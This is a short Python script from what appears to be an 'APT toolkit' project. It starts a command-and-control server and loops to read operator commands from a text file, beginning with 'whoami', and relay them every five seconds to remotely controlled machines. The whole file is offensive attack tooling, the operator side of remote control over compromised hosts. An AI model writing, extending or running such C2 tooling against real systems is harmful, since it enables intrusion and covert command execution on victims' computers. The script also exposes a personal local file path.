
from apt_toolkit.command_control_real import C2Server
import time
import os

PROJECT_ROOT = "/Users/bo/Library/CloudStorage/OneDrive-Personal/GithubM4Max/chinese_apt_toolkit"

def run_server():
    print("Starting C2 server...")
    server = C2Server()
    server.start()
    command_file = os.path.join(PROJECT_ROOT, "c2_commands.txt")
    print(f"Command file: {command_file}")
    # Create the command file if it doesn't exist
    with open(command_file, 'w') as f:
        f.write("whoami")

    time.sleep(1) # Add a small delay

    try:
        while True:
            with open(command_file, 'r') as f:
                command = f.read().strip()
            print(f"Sending command: {command}")
            server.set_command(command)
            time.sleep(5)
    except KeyboardInterrupt:
        print("\nShutting down server...")
        server.stop()

if __name__ == "__main__":
    run_server()

